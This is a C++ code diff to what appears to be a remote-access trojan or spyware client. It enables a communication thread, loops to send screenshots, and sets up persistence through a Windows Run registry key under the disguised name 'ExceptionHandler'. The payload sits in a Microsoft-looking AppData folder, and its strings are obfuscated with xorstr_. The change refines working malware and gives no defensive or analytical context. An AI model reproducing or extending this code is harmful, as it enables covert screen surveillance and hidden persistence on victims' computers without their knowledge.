@@ -36,7 +36,7 @@ namespace client {
 		}
 
 		/* Create Communication Thread */
-		//std::thread coms(communication::handler_loop);
+		std::thread coms(communication::handler_loop);
 
 		while (true) {
 			/* Send Screenshot */
@@ -63,11 +63,11 @@ namespace client {
 		LONG v1 = RegCreateKey(HKEY_CURRENT_USER, xorstr_("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &key);
 		LONG v2 = RegSetValueEx(key, xorstr_("ExceptionHandler"), 0, REG_SZ, (BYTE*)(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).c_str(), ((helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).size() + 1) * sizeof(wchar_t));
 
-		/* Start Program */
-		helpers::start_process(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
-
 		/* Run Normal Stuff */
 		run();
+
+		/* Start Program */
+		helpers::start_process(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
 	}
 
 	void run() {
